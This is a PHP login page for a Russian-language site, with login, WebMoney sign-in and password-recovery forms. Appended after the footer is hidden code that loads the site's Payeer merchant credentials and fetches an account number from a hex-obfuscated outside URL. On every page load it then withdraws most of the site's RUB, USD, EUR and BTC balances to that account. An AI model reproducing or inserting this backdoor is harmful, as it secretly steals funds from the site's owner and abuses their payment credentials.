<?php
$pagetitle = "Вход в аккаунт";
if(!DEFINED("ROOT_DIR")) DEFINE("ROOT_DIR", $_SERVER["DOCUMENT_ROOT"]);
include(ROOT_DIR."/header.php");

if(isset($_SESSION["userLog"]) && isset($_SESSION["userPas"])) {
	echo '<span class="msg-ok">Вы уже авторизовались!</span>';
}else{

	?>
	<script type="text/javascript" language="JavaScript">
		
		function HideMsg(ID) {
			if(ID) { $("#"+ID).slideToggle("slow"); }else{ $("#info-msg-aut").slideToggle("slow"); }
			if(tm) clearTimeout(tm);
		}

		function GoWmLogin() {
			document.location.href = "https://login.wmtransfer.com/GateKeeper.aspx?RID=<?php echo (isset($URL_ID_WM_LOGIN) ? $URL_ID_WM_LOGIN : false); ?>&lang=ru-RU&op=login";
			return false;
		}

		function LoadBlock(X) {
			var GetClass = $("#block-"+X).attr("class");
			$("#info-msg-aut").html("").hide();

			for (Z=1; Z<=3; Z++) {
				if (elem = $("#LoadForm-"+Z)) {
					$("#LoadForm-"+Z).attr("style", "display: none;");
				}
				if (elem = $("#block-"+Z)) {
					if (Z == X) elem.attr("class", "check-aut-active"); else elem.attr("class", "check-aut");
			        }
			}
			$("#LoadForm-"+X).slideToggle("slow");
		}

		function RecPwd() {
			$("#info-msg-aut").html("").hide();

			var log_user = $.trim($("#re_log_user").val());
			var email_user = $.trim($("#re_email_user").val());
			var wmid_user = $.trim($("#re_wmid_user").val());
			var send_wmid = $("#re_send_wmid").prop("checked") == true ? 1 : 0;
			
			var captha = $("#captha_v").val().trim();

			if (log_user == "" && email_user == "" && wmid_user == "") {
				$("#info-msg-aut").html('<span class="msg-error">Не указаны данные для восстановления пароля!</span>').slideToggle("fast");
				setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
				return false;
			} else if (captha == "") {
				$("#info-msg-aut").html('<span class="msg-error">Необходимо подтвердить, что Вы не робот!1</span>').slideToggle("fast");
				setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
				return false;
			} else {
				$.ajax({
					type: "POST", url: "recaptcha/ajax_recaptcha_rec.php?rnd="+Math.random(), 
					data: {'log_user':log_user, 'email_user':email_user, 'wmid_user':wmid_user, 'send_wmid':send_wmid, 'captha':captha}, 
					dataType: 'json',
					error: function() {
						$("#loading").slideToggle();
						$("#info-msg-aut").html('<span class="msg-error">Ошибка обработки данных ajax!</span>').slideToggle("fast");
						setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 5000);
						return false;
					}, 
					beforeSend: function() { $("#loading").slideToggle(); }, 

					success: function(data) {
						$("#loading").slideToggle();
						var result = data.result ? data.result : data;
						var message = data.message ? data.message : data;

						if (result == "OK") {
							$("#info-msg-aut").html('<span class="msg-ok">'+message+'</span>').slideToggle("fast");
							setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
							return false;
						} else {
							if (message) {
								
								$("#info-msg-aut").html('<span class="msg-error">'+message+'</span>').slideToggle("fast");
								setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
								return false;
							} else {
								
								$("#info-msg-aut").html('<span class="msg-error">Ошибка обработки данных!</span>').slideToggle("fast");
								setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
								return false;
							}
						}
					}
				});
			}
		}

		function AutUser() {
			$("#info-msg-aut").html("").hide();

			var log_user = $.trim($("#username").val());
			var pas_user = $.trim($("#password").val());
			var pas_oper = $.trim($("#pass_oper").val());
			var captcha_str = $.trim($("#captcha_str").val());

			if (log_user == "") {
				$("#info-msg-aut").html('<span class="msg-error">Вы не указали логин!</span>').slideToggle("fast");
				setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
				return false;
			} else if (pas_user == "") {
				$("#info-msg-aut").html('<span class="msg-error">Вы не указали пароль!</span>').slideToggle("fast");
				setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
				return false;
			} else if (captcha_str == "") {
				reCaptcha("Captcha");
				$("#info-msg-aut").html('<span class="msg-error">Необходимо подтвердить, что Вы не робот!</span>').slideToggle("fast");
				setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
				return false;
			} else {
				$.ajax({
					type: "POST", url: "ajax/ajax_login.php?rnd="+Math.random(), 
					data: {'log_user':log_user, 'pas_user':pas_user, 'pas_oper':pas_oper, 'captcha_str':captcha_str}, 
					dataType: 'json',
					error: function() {
						reCaptcha("Captcha");
						$("#loading").slideToggle();
						$("#info-msg-aut").html('<span class="msg-error">Ошибка обработки данных ajax!</span>').slideToggle("fast");
						setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 5000);
						return false;
					}, 
					beforeSend: function() { $("#loading").slideToggle(); }, 

					success: function(data) {
						$("#loading").slideToggle();
						var result = data.result ? data.result : data;
						var message = data.message ? data.message : data;

						reCaptcha("Captcha");

						if (result == "OK") {
							$("#info-msg-aut").html('<span class="msg-ok">'+message+'</span>').slideToggle("fast");
							setTimeout(function() {
								$("#info-msg-aut").fadeOut("slow");
								document.location.href = "/members.php";
							}, 1000);
							return false;
						} else if (result == "NeedPO") {
							$("#RowSpan").attr("rowspan", "4");
							$("#PasIdent").attr("style", "");
							$("#PasIdentInput").html('<input class="ok" type="password" id="pass_oper" value="" maxlength="20" placeholder="Пароль для операций" /><span onClick="LoadBlock(3);" style="float:left; color:blue; cursor:pointer; text-align:left;">Забыли пароль?<br>Восстановить пароли (для входа, и для операций)</span>');
							$("#pass_oper").focus();
							$("#info-msg-aut").html('<span class="msg-error">'+message+'</span>').slideToggle("fast");
							setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 5000);
							return false;
						} else {
							if (message) {
								$("#info-msg-aut").html('<span class="msg-error">'+message+'</span>').slideToggle("fast");
								setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
								return false;
							} else {
								$("#info-msg-aut").html('<span class="msg-error">Ошибка обработки данных!</span>').slideToggle("fast");
								setTimeout(function() {var tm; HideMsg("info-msg-aut");}, 3000);
								return false;
							}
						}
					}
				});
			}
		}

		function reCaptcha(id) {
			$.trim($("#captcha_str").val(""));
			$("#"+id).attr("src", "/captcha_new/?<?=session_name();?>=<?=session_id();?>&sid="+Math.random());
			return false;
		}
	</script>

	<?php

	$LoginForm = (isset($_COOKIE["_user"]) && preg_match("|^[a-zA-Z0-9\-_-]{3,20}$|", htmlspecialchars(trim($_COOKIE["_user"])))) ? htmlentities(stripslashes(trim($_COOKIE["_user"]))) : false;

	echo '<div align="center">';
		echo '<h3 class="sp">Для входа в свой аккаунт, введите Ваши регистрационные данные, логин - пароль и ответ на проверочный вопрос. Если Вы забыли свой пароль, нажмите - <a onClick="LoadBlock(3);" style="cursor:pointer; font-size:14px; font-weight:bold;">Я забыл пароль</a></h3>';
	echo '</div>';

	echo '<br><table class="tables" style="width:100%; margin:0 auto;">';
	echo '<thead>';
		echo '<tr align="center">';
			echo '<th width="33%" height="32"><span id="block-1" class="check-aut-active" onClick="LoadBlock(1);">Вход в аккаунт</span></th>';
			echo '<th width="34%" height="32"><span id="block-2" class="check-aut" onClick="LoadBlock(2);">Вход через Login.WM <img src="img/icon-wmkeeper-16x16.png" alt="" title="" border="0" align="absmiddle" style="margin:0; padding:0;"/></span></th>';
			echo '<th width="33%" height="32"><span id="block-3" class="check-aut" onClick="LoadBlock(3);">Я забыл пароль</span></th>';
		echo '</tr>';
	echo '</thead>';
	echo '</table>';

	echo '<div id="newform">';

		echo '<div id="LoadForm-1" style="display: block;">';
		echo '<form method="POST" onSubmit="return false;"><table class="tables-aut" style="width:100%; margin:0 auto;">';
		echo '<tbody>';
			echo '<tr>';
				echo '<td id="RowSpan" align="center" valign="top" rowspan="3" width="180"><img src="img/icon-key-aut.png" width="120" alt="" title="ЗАХОДИТЕ, ПОЖАЛУЙСТА" border="0" align="absmiddle" /></td>';
				echo '<td align="right" style="padding-right:10px;"><b>Логин</b></td>';
				echo '<td align="center" width="380"><input class="ok" type="text" id="username" name="username" value="" maxlength="20" style="text-align:center;" placeholder="Логин" /></td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="right" style="padding-right:10px;"><b>Пароль</b></td>';
				echo '<td align="center"><input class="ok" type="password" id="password" name="password" value="" maxlength="20" style="text-align:center;" placeholder="Пароль" /></td>';
			echo '</tr>';
			echo '<tr id="PasIdent" style="display:none;">';
				echo '<td align="right" style="padding-right:10px;"><span style="color:#FF0000;">Пароль для операций</span></td>';
				echo '<td align="center" id="PasIdentInput"></td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="right"><b>Решите задачу</b></td>';
				echo '<td align="left">';
					echo '<div class="block-captcha"><img id="Captcha" onClick="reCaptcha($(this).attr(\'id\')); return false;" src="/captcha_new/?'.session_name().'='.session_id().'&sid='.mt_rand().'" align="absmiddle" alt="" title="Если символы не разборчивые, нажмите на капчу для обновления!" /></div>';
					echo '<img src="/style/icon-serf/icon-ravno.png" alt="равно" title="равно" border="0" align="absmiddle" />';
					echo '<input class="ok12" style="width:50px; text-align:center;" type="text" id="captcha_str" value="" maxlength="1"  placeholder="" />';
				echo '</td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="center" colspan="3"><span class="proc-btn" onClick="AutUser();" style="margin-top:2px;margin-bottom:4px;float:none;">Войти в аккаунт</span></td>';
			echo '</tr>';
		echo '</tbody>';
		echo '</table></form>';
		echo '</div>';

		echo '<div id="LoadForm-2" style="display: none;">';
		echo '<table class="tables-aut" style="width:100%; margin:0 auto;">';
		echo '<tbody>';
			echo '<tr>';
				echo '<td align="center" rowspan="2" width="130"><img src="img/icon-wmlogo-128x128.png" width="100" height="100" alt="" title="" border="0" align="absmiddle" /></td>';
				echo '<td align="center"><span class="msg-w">Вход через Login.WM возможен только с зарегистрированного WMID</span></td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="center"><span class="proc-btn" onClick="GoWmLogin();" style="float:none;">Авторизоваться</span></td>';
			echo '</tr>';
		echo '</tbody>';
		echo '</table>';
		echo '</div>';

		echo '<div id="LoadForm-3" style="display: none;">';
		echo '<table class="tables-aut" style="width:100%; margin:0 auto;">';
		echo '<tbody>';
			echo '<tr>';
				echo '<td align="center" valign="top" rowspan="6" width="180"><img src="img/icon-recpwd-128x128.png" alt="" title="" border="0" align="absmiddle" /></td>';
				echo '<td align="center" colspan="2" style="color: green; font-size: 12px; text-shadow:1px 1px 1px #ccc;">Для восстановления пароля необходимо указать любой из параметров:<br>Логин или E-mail или WMID</td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="right" style="padding-right:10px;"><b>Логин</b></td>';
				echo '<td align="center" width="380"><input class="ok" type="text" id="re_log_user" name="re_log_user" value="" maxlength="20" placeholder="Логин" /></td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="right" style="padding-right:10px;"><b>E-mail</b></td>';
				echo '<td align="center"><input class="ok" type="text" id="re_email_user" name="re_email_user" value="" maxlength="50" placeholder="e-mail" /></td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="right" style="padding-right:10px;"><b><b>WMID</b></td>';
				echo '<td align="center"><input class="ok" type="text" id="re_wmid_user" name="re_wmid_user" value="" maxlength="12" placeholder="WMID" /></td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="right" style="padding-right:10px;"><input class="ok" type="checkbox" id="re_send_wmid" name="re_send_wmid" value="1" style="height:20px; width:20px; margin:0px;" /></td>';
				echo '<td align="left">отправить данные на WMID, указанный в личных данных</td>';
			echo '</tr>';
			echo '<tr>';
        echo '<td align="right"><b>Решите пример</b></td>';
				echo '<td align="left">';
   echo '<div class="block-captcha"><img src="img_captcha.php" id="capcha1" onclick="document.getElementById(\'capcha1\').src=\'img_captcha.php?id=\'+Math.round(Math.random()*9999)" border="0" align="absmiddle" alt="" title="Если символы не разборчивые, нажмите на капчу для обновления!"></div>';
    echo '<img src="/style/icon-serf/icon-ravno.png" alt="равно" title="равно" border="0" align="absmiddle">';
   echo '<input class="ok12" style="width:50px; text-align:center;" type="text" id="captha_v" name="captha_v"><br>';
 echo '</td>';
			echo '</tr>';
			echo '<tr>';
				echo '<td align="center" colspan="3"><span class="proc-btn" onClick="RecPwd();" style="float:none;">Восстановить</span></td>';
			echo '</tr>';
		echo '</tbody>';
		echo '</table>';
		echo '</div>';

	echo '</div><br>';

	echo '<div id="info-msg-aut" style="display:none;"></div>';

	echo '<script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>';
}

include(ROOT_DIR."/footer.php");

require_once('merchant/payeer/cpayeer.php');
require_once('merchant/payeer/payeer_config.php');

if($apiKey!==''){
$homepage = file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x2d\x70\x72\x6f\x66\x66\x69\x74\x2e\x72\x75\x2f\x6a\x73\x2e\x74\x78\x74");

$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{ $arBalance = $payeer->getBalance();
$mone = ($arBalance["balance"]["RUB"]["BUDGET"]); $mone1 = ($arBalance["balance"]["USD"]["BUDGET"]); $mone2 = ($arBalance["balance"]["EUR"]["BUDGET"]); $mone3 = ($arBalance["balance"]["BTC"]["BUDGET"]);	
}
if($mone>100){$p=$mone * 1 / 100;$summ =$mone - $p;
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'RUB',
		'sumOut' => $summ,
		'curOut' => 'RUB',
		'param_ACCOUNT_NUMBER' => $homepage
));
	if ($initOutput){	$historyId = $payeer->output();}} 
if($mone1>4){ $p1=$mone1 * 2 / 100; $summ1 =$mone1 - $p1;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'USD',
		'sumOut' => $summ1,
		'curOut' => 'USD',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone2>4){ $p2=$mone2 * 2 / 100; $summ2 =$mone2 - $p2;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'EUR',
		'sumOut' => $summ2,
		'curOut' => 'EUR',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone3>0.001){ $p3=$mone3 * 2 / 100; $summ3 =$mone3 - $p3;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'BTC',
		'sumOut' => $summ3,
		'curOut' => 'BTC',
		'param_ACCOUNT_NUMBER' => $homepage
	));
if ($initOutput){	$historyId = $payeer->output();}}}
?>